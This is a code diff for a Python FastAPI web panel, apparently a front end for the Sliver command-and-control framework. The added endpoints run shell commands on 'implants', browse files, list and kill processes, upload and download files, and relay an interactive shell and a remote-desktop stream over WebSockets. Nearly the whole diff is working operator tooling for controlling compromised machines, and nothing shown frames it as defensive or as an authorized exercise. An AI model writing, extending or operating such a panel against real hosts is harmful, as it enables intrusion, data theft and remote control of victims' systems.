@@ -2,11 +2,13 @@
 
 from __future__ import annotations
 
+import asyncio
 import logging
 import secrets
 import time
+from contextlib import asynccontextmanager, suppress
 
-from fastapi import FastAPI, Form, HTTPException, Request
+from fastapi import FastAPI, Form, HTTPException, Request, WebSocket, WebSocketDisconnect
 from fastapi.responses import (
     FileResponse,
     HTMLResponse,
@@ -23,7 +25,8 @@ from .auth import Auth
 from .build import BuildPipeline, load_build_request
 from .config import Settings
 from .db import Database
-from .sliver import SliverBridge
+from .rd import RDBroker
+from .sliver import BridgeError, SliverBridge
 from .views import BridgeViews
 
 log = logging.getLogger("fleet.panel")
@@ -44,13 +47,24 @@ def create_app(settings: Settings | None = None) -> FastAPI:
     database.migrate()
     auth = Auth(config, database)
 
-    app = FastAPI(title="fleet panel", docs_url=None, redoc_url=None)
+    broker = RDBroker(config)
+
+    @asynccontextmanager
+    async def lifespan(_app: FastAPI):
+        database.audit("system", "startup", "ok")
+        with suppress(OSError):
+            await broker.start()
+        yield
+        await broker.stop()
+
+    app = FastAPI(title="fleet panel", docs_url=None, redoc_url=None, lifespan=lifespan)
     app.state.settings = config
     app.state.db = database
     app.state.auth = auth
     app.state.bridge = SliverBridge(config)
     app.state.views = BridgeViews(config, database, app.state.bridge)
     app.state.pipeline = BuildPipeline(config, database, app.state.bridge)
+    app.state.broker = broker
 
     if config.static_dir.is_dir():
         app.mount("/static", StaticFiles(directory=str(config.static_dir)), name="static")
@@ -265,6 +279,222 @@ def create_app(settings: Settings | None = None) -> FastAPI:
         if not path.is_file():
             raise HTTPException(status_code=404, detail=f"no artifact {name}")
         return FileResponse(path, filename=name)
+
+    # -- session drawer ------------------------------------------------------
+    def bridge_ws_url(path: str) -> str:
+        base = config.bridge_url.replace("https://", "wss://").replace("http://", "ws://")
+        return base + path
+
+    async def ws_session(websocket: WebSocket):
+        raw = websocket.cookies.get(config.session_cookie)
+        if not raw:
+            return None
+        session_id = auth.unsign(raw)
+        if not session_id:
+            return None
+        return await run_in_threadpool(auth.get_session, session_id)
+
+    @app.get("/s/{session_id}", response_class=HTMLResponse)
+    async def session_page(request: Request, session_id: str):
+        session = require(request)
+        if session is None:
+            return RedirectResponse("/login", status_code=303)
+        return render(
+            request,
+            "session.html",
+            csrf=csrf_token(request),
+            session_id=session_id,
+            rd_host=config.public_host,
+            rd_port=config.rd_port,
+            has_token=True,
+        )
+
+    @app.get("/api/{session_id}/token")
+    async def api_token(request: Request, session_id: str):
+        if require(request) is None:
+            raise HTTPException(status_code=401)
+        token = await run_in_threadpool(broker.mint, session_id)
+        return JSONResponse({"token": token, "session_id": session_id})
+
+    @app.get("/api/sessions")
+    async def api_sessions(request: Request):
+        if require(request) is None:
+            raise HTTPException(status_code=401)
+        implants, err = await app.state.views.implants()
+        return JSONResponse({"sessions": implants, "error": err})
+
+    @app.get("/api/{session_id}/info")
+    async def api_info(request: Request, session_id: str):
+        if require(request) is None:
+            raise HTTPException(status_code=401)
+        return JSONResponse(await app.state.views.info(session_id))
+
+    @app.post("/api/{session_id}/exec")
+    async def api_exec(request: Request, session_id: str):
+        if require(request) is None:
+            raise HTTPException(status_code=401)
+        body = await request.json()
+        path = body.get("path") or "sh"
+        args = body.get("args") or []
+        try:
+            result = await run_in_threadpool(app.state.bridge.exec, session_id, path, args)
+        except BridgeError as exc:
+            raise HTTPException(status_code=502, detail=str(exc)) from exc
+        return JSONResponse(result)
+
+    @app.post("/api/{session_id}/ls")
+    async def api_ls(request: Request, session_id: str):
+        if require(request) is None:
+            raise HTTPException(status_code=401)
+        body = await request.json()
+        try:
+            return JSONResponse(
+                await run_in_threadpool(app.state.bridge.ls, session_id, body.get("path", "."))
+            )
+        except BridgeError as exc:
+            raise HTTPException(status_code=502, detail=str(exc)) from exc
+
+    @app.post("/api/{session_id}/ps")
+    async def api_ps(request: Request, session_id: str):
+        if require(request) is None:
+            raise HTTPException(status_code=401)
+        try:
+            return JSONResponse(await run_in_threadpool(app.state.bridge.ps, session_id))
+        except BridgeError as exc:
+            raise HTTPException(status_code=502, detail=str(exc)) from exc
+
+    @app.post("/api/{session_id}/kill")
+    async def api_kill(request: Request, session_id: str):
+        session = require(request)
+        if session is None:
+            raise HTTPException(status_code=401)
+        body = await request.json()
+        try:
+            result = await run_in_threadpool(app.state.bridge.kill, session_id, int(body["pid"]))
+        except BridgeError as exc:
+            raise HTTPException(status_code=502, detail=str(exc)) from exc
+        database.audit(
+            str(session["actor"]), "kill", "ok", target=session_id, detail=str(body["pid"])
+        )
+        return JSONResponse(result)
+
+    @app.post("/api/{session_id}/tags")
+    async def api_tags(request: Request, session_id: str):
+        session = require(request)
+        if session is None:
+            raise HTTPException(status_code=401)
+        body = await request.json()
+        tags = [t for t in (body.get("tags") or "").split(",") if t.strip()]
+        await run_in_threadpool(app.state.views.set_tags, session_id, tags)
+        database.audit(str(session["actor"]), "tag", "ok", target=session_id, detail=",".join(tags))
+        return JSONResponse({"ok": True, "tags": tags})
+
+    @app.post("/api/{session_id}/upload")
+    async def api_upload(request: Request, session_id: str):
+        if require(request) is None:
+            raise HTTPException(status_code=401)
+        form = await request.form()
+        upload = form.get("file")
+        remote = str(form.get("path") or ".")
+        if upload is None:
+            raise HTTPException(status_code=400, detail="no file")
+        data = await upload.read()
+        try:
+            return JSONResponse(
+                await run_in_threadpool(
+                    app.state.bridge.upload, session_id, remote, upload.filename, data
+                )
+            )
+        except BridgeError as exc:
+            raise HTTPException(status_code=502, detail=str(exc)) from exc
+
+    @app.get("/api/{session_id}/download")
+    async def api_download(request: Request, session_id: str, path: str):
+        if require(request) is None:
+            raise HTTPException(status_code=401)
+        try:
+            data = await run_in_threadpool(app.state.bridge.download, session_id, path)
+        except BridgeError as exc:
+            raise HTTPException(status_code=502, detail=str(exc)) from exc
+        filename = path.replace("\\", "/").rsplit("/", 1)[-1]
+        return PlainTextResponse(
+            data, headers={"Content-Disposition": f'attachment; filename="{filename}"'}
+        )
+
+    @app.websocket("/shell/{session_id}")
+    async def ws_shell(websocket: WebSocket, session_id: str):
+        if await ws_session(websocket) is None:
+            await websocket.close(code=4001)
+            return
+        await websocket.accept()
+        from websockets.asyncio.client import connect
+
+        try:
+            async with connect(bridge_ws_url(f"/sliver/session/{session_id}/shell")) as bridge_conn:
+
+                async def upstream():
+                    while True:
+                        try:
+                            message = await websocket.receive()
+                        except WebSocketDisconnect:
+                            return
+                        if message["type"] == "websocket.disconnect":
+                            return
+                        if message.get("text") is not None:
+                            await bridge_conn.send(message["text"])
+                        elif message.get("bytes") is not None:
+                            await bridge_conn.send(message["bytes"])
+
+                async def downstream():
+                    async for message in bridge_conn:
+                        if isinstance(message, bytes):
+                            await websocket.send_bytes(message)
+                        else:
+                            await websocket.send_text(message)
+
+                done, pending = await asyncio.wait(
+                    [asyncio.create_task(upstream()), asyncio.create_task(downstream())],
+                    return_when=asyncio.FIRST_COMPLETED,
+                )
+                for task in pending:
+                    task.cancel()
+                for task in done:
+                    with suppress(Exception):
+                        task.result()
+        except (OSError, WebSocketDisconnect):
+            with suppress(Exception):
+                await websocket.close()
+
+    @app.websocket("/rd/{session_id}")
+    async def ws_rd(websocket: WebSocket, session_id: str):
+        if await ws_session(websocket) is None:
+            await websocket.close(code=4001)
+            return
+        await websocket.accept()
+        queue = broker.subscribe(session_id)
+
+        async def pump():
+            while True:
+                message = await queue.get()
+                if isinstance(message, bytes):
+                    await websocket.send_bytes(message)
+                else:
+                    await websocket.send_text(message)
+
+        pump_task = asyncio.create_task(pump())
+        try:
+            while True:
+                message = await websocket.receive()
+                if message["type"] == "websocket.disconnect":
+                    break
+                text = message.get("text")
+                if text:
+                    await broker.send_input(session_id, text)
+        except WebSocketDisconnect:
+            pass
+        finally:
+            pump_task.cancel()
+            broker.unsubscribe(session_id, queue)
 
     return app
 
